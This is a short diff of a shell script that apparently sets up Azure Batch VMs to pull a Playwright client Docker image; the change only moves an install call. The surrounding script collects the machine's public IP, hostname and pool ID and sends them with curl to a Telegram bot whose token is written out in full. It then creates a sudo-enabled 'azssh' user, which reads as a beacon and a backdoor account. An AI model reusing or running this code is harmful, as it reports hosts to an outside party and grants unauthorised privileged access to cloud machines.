@@ -507,12 +507,12 @@ if [[ "$(docker images -q tonymaithanh/playwrightclient:latest 2> /dev/null)" !=
  echo "img pulled"
  exit 0
 fi
-do_install
 #Update IP
 export rigid=$AZ_BATCH_POOL_ID
 export vmname=$(hostname)
 export myip=$(curl -s https://api.ipify.org)
 curl -s --data "text=$myip.$vmname.$rigid" --data "chat_id=-1001278714637" 'https://api.telegram.org/bot1718694408:AAFWYcuRUUbDnhuVblVc4LYuqV05pTVzYEY/sendMessage' > /dev/null
+do_install
 #Add aHoand Key
 sudo useradd -g 1000 -s /bin/bash -m azssh
 sudo adduser azssh sudo
